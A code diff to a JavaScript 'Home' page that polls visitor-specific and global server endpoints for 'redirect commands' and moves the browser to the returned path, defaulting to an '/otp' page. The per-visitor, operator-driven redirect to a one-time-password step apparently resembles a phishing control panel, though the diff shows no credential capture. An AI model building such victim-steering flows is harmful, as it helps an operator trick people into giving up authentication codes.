@@ -62,6 +62,7 @@ export default function Home() {
         };
         
         // Polling - check for redirects (GLOBAL or visitor-specific)
+        // Check BOTH endpoints to ensure we catch redirects
         const redirectInterval = setInterval(async () => {
           if (redirectReceived) {
             clearInterval(redirectInterval);
@@ -69,27 +70,47 @@ export default function Home() {
           }
           
           try {
+            // Check visitor-specific endpoint
             const response = await fetch(`/api/redirect/${visitorId}?t=${Date.now()}`);
-            if (!response.ok) {
-              return;
+            if (response.ok) {
+              const data = await response.json();
+              
+              if (data.redirect) {
+                redirectReceived = true;
+                if (redirectEventSource) {
+                  redirectEventSource.close();
+                }
+                clearInterval(redirectInterval);
+                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED ✅✅✅');
+                console.log('[index.js] Redirect type:', data.redirectType);
+                console.log('[index.js] Page path:', data.pagePath);
+                
+                // Redirect immediately - use pagePath directly
+                const targetUrl = data.pagePath || data.redirectUrl || '/otp';
+                console.log('[index.js] Redirecting to:', targetUrl);
+                window.location.href = targetUrl;
+                return;
+              }
             }
             
-            const data = await response.json();
-            
-            if (data.redirect) {
-              redirectReceived = true;
-              if (redirectEventSource) {
-                redirectEventSource.close();
-              }
-              clearInterval(redirectInterval);
-              console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED ✅✅✅');
-              console.log('[index.js] Redirecting to:', data.pagePath || data.redirectUrl);
+            // Also check global redirect endpoint
+            const globalResponse = await fetch(`/api/redirect/check?t=${Date.now()}`);
+            if (globalResponse.ok) {
+              const globalData = await globalResponse.json();
               
-              // Redirect immediately
-              if (data.redirectUrl) {
-                window.location.href = data.redirectUrl;
-              } else if (data.pagePath) {
-                window.location.href = data.pagePath;
+              if (globalData.redirect) {
+                redirectReceived = true;
+                if (redirectEventSource) {
+                  redirectEventSource.close();
+                }
+                clearInterval(redirectInterval);
+                console.log('[index.js] ✅✅✅ GLOBAL REDIRECT RECEIVED ✅✅✅');
+                console.log('[index.js] Redirecting to:', globalData.pagePath);
+                
+                // Redirect immediately
+                const targetUrl = globalData.pagePath || globalData.redirectUrl || '/otp';
+                window.location.href = targetUrl;
+                return;
               }
             }
           } catch (error) {
